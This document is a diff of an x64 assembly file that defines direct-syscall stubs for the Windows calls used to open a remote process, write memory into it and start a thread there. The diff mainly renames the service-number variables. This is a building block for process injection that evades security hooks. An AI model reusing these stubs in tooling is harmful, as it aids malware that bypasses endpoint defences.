@@ -1,53 +1,51 @@
-.data
-
-EXTERN NtCloseSSN:DWORD                
-EXTERN NtOpenProcessSSN:DWORD          
-EXTERN NtCreateThreadExSSN:DWORD       
-EXTERN NtWriteVirtualMemorySSN:DWORD   
-EXTERN NtWaitForSingleObjectSSN:DWORD  
-EXTERN NtAllocateVirtualMemorySSN:DWORD
+.data 
+extern g_NtOpenProcessSSN:DWORD
+extern g_NtAllocateVirtualMemorySSN:DWORD
+extern g_NtWriteVirtualMemorySSN:DWORD
+extern g_NtCreateThreadExSSN:DWORD
+extern g_NtWaitForSingleObjectSSN:DWORD
+extern g_NtCloseSSN:DWORD
 
 .code
-
-NtOpenProcess proc
+NtOpenProcess proc 
 		mov r10, rcx
-		mov eax, NtOpenProcessSSN       ; SSN will be retrieved by reading &function+0x4
-		syscall                         ; can replace with int 2eh as well
+		mov eax, g_NtOpenProcessSSN       
+		syscall                         
 		ret                             
 NtOpenProcess endp
 
-NtAllocateVirtualMemory proc
+NtAllocateVirtualMemory proc    
 		mov r10, rcx
-		mov eax, NtAllocateVirtualMemorySSN      
+		mov eax, g_NtAllocateVirtualMemorySSN      
 		syscall                        
 		ret                             
 NtAllocateVirtualMemory endp
 
-NtWriteVirtualMemory proc
+NtWriteVirtualMemory proc 
 		mov r10, rcx
-		mov eax, NtWriteVirtualMemorySSN      
+		mov eax, g_NtWriteVirtualMemorySSN      
 		syscall                        
 		ret                             
-NtWriteVirtualMemory endp
+NtWriteVirtualMemory endp 
 
-NtCreateThreadEx proc
+NtCreateThreadEx proc 
 		mov r10, rcx
-		mov eax, NtCreateThreadExSSN      
+		mov eax, g_NtCreateThreadExSSN      
 		syscall                        
 		ret                             
-NtCreateThreadEx endp
+NtCreateThreadEx endp 
 
-NtWaitForSingleObject proc
+NtWaitForSingleObject proc 
 		mov r10, rcx
-		mov eax, NtWaitForSingleObjectSSN      
+		mov eax, g_NtWaitForSingleObjectSSN      
 		syscall                        
 		ret                             
-NtWaitForSingleObject endp
+NtWaitForSingleObject endp 
 
-NtClose proc
+NtClose proc 
 		mov r10, rcx
-		mov eax, NtCloseSSN      
+		mov eax, g_NtCloseSSN      
 		syscall                        
 		ret                             
-NtClose endp
+NtClose endp 
 end
